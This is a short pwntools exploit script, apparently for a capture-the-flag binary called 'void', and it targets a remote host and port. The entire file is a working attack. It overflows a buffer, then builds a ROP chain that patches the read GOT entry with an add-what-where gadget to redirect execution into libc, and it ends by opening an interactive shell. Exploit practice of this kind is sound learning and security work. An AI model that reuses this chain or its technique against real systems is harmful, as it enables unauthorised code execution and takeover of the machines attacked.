from pwn import *

exe = ELF("./void")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

context.binary = exe
context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

remote_url = "165.232.98.69"
remote_port = 31312
gdbscript = """
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r


r = conn()

pop_rdi = 0x00000000004011BB
pop_rsi_r15 = 0x00000000004011B9
add_what_where = 0x0000000000401108
pop_rbx_rbp_r12_r13_r14_r15 = 0x004011B2
ret_address = pop_rdi + 1

read_plt = exe.plt["read"]
read_got = exe.got["read"]

# Load stage 2 rop
payload = b"a" * 0x48
payload += (
    p64(pop_rbx_rbp_r12_r13_r14_r15)
    + p64(0xFFFDCE9A)
    + p64(read_got + 0x3D)
    + p64(0) * 4
)
payload += p64(add_what_where)
payload += p64(read_plt)
r.sendline(payload)
r.interactive()
